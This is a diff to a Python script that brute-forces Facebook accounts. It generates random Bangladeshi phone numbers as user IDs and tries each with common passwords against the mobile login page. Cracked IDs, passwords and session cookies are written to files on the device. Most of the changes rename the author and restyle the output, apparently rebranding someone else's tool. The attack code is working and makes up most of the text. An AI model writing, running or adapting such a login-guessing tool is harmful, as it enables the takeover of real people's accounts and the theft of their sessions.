@@ -1,9 +1,9 @@
 #Script         
 #    Respotary   Star  
 #----------------------------------------------------------------------------------------------------------
-#CREATE BY : MUMIT ISLAM HIMU
+#CREATE BY : DEVHIS ISLAM HIMU
 #WHATSAPP : +8801644777805
-#GITHUB : https://github.com/MUMIT-404-CYBER
+#GITHUB : https://github.com/DEVHIS-404-CYBER
 #----------------------------------------------------------------------------------------------------------
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
@@ -106,17 +106,17 @@ logo1 = ("""\x1b[1;92m
 ┃\033[1;34mFACEBOOK  : \x1b[1;92mHASAN IMAM┃\x1b[1;96mTYPE : \033[1;37m\x1b[41mFREE\x1b[0m \x1b[1;92mRANDOM┃
 ┗━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━┛\x1b[0m""")
 
-def mumitx():
+def DEVHISx():
 	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 def Main():
         os.system("clear")
         print(logo)
         print(" [1] RANDOM CRACK")
         print(" [0] Exit")
-        Mumit =input("\n [?] Choose : ")
-        if Mumit in ["1","01"]:
+        DEVHIS =input("\n [?] Choose : ")
+        if DEVHIS in ["1","01"]:
             fuck()
-        if Mumit in [" 0", "00"]:
+        if DEVHIS in [" 0", "00"]:
             exit()
         else:
             exit()
@@ -125,14 +125,14 @@ def fuck():
     user=[]
     os.system('clear')
     print(logo)
-    print('[+] EXAMPLE CODE: 017, 018, 019, 016')
-    code = input('[?] CHOOSE CODE : ')
+    print('┏━[•]  EXAMPLE CODE: 017, 018, 019, 016')
+    code = input('┗━[+] CHOOSE CODE : ')
     name = ''.join(random.choice(string.digits) for _ in range(2))
     cod = ''.join(random.choice(string.digits) for _ in range(2))
     os.system('clear')
     print(logo)
-    print('[+] EXAMPLE: 2000 3000 5000 10000 ')
-    limit = int(input('[?] CHOOSE : '))
+    print('┏━[•]  EXAMPLE: 2000 3000 5000 10000 ')
+    limit = int(input('┗━[+] CHOOSE : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
@@ -141,21 +141,21 @@ def fuck():
         os.system('xdg-open https://github.com/X74TEAM')
         print(logo1)
         tl = str(len(user))
-        print('[+] Total ids: '+tl)
-        print("[+] Your Code: "+code)
-        print('[+] Process has been started')
-        print('[+] Use flight mode for speed up')
+        print('┏━[•] Total ids: '+tl)
+        print('┣━[•] Your Code: '+code)
+        print('┣━[•] Process has been started')
+        print('┗━[•] Use flight mode for speed up')
         print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         for love in user:
             uid = code+name+cod+love
             pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','i love you','iloveyou','imissyou','i miss you','free fire','freefire','102030','203040','304050','405060','506070','607080','708090','8090100','135790']
-            yaari.submit(mumit2,uid,pwx,tl)
+            yaari.submit(DEVHIS2,uid,pwx,tl)
     print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    print(' [+] Crack process has been completed')
-    print(' [+] OK Ids saved in INNOCENT/OK.txt')
-    print(' [+] CP Ids saved in INNOCENT/CP.txt')
+    print(' ┏━[•] Crack process has been completed')
+    print(' ┣━[•] OK Ids saved in DEVHIS-OK.txt')
+    print(' ┗━[•] CP Ids saved in DEVHIS-CP.txt')
     print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-def mumit2(uid,pwx,tl):
+def DEVHIS2(uid,pwx,tl):
     global loop
     global cps
     global oks
@@ -164,7 +164,7 @@ def mumit2(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r\033[1;92m[RUNNING]--[%s/%s]--[OK-%s] ~ [CP-%s] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write(f'\r\033[1;92m[RUNNING]▶[%s/%s]  [OK-%s] ~ [CP-%s] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
@@ -201,15 +201,15 @@ def mumit2(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[1;92m[DEVHIS-OK] {uid}|{ps} \nCookie : {coki}")
-                open('/sdcard/INNOCENT/OK.txt', 'a').write( uid+' | '+ps+'\n')
+                print(f"\033[1;92m[ACTIVE] {uid} | {ps} \nCookie : {coki}")
+                open('/sdcard/DEVHIS-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\033[1;94m[DEVHIS-CP] {cid} | {ps} \n")
-                open('/sdcard/INNOCENT-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print(f"\033[1;94m[DEVHIS-CP] {cid} | {ps}")
+                open('/sdcard/DEVHIS-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
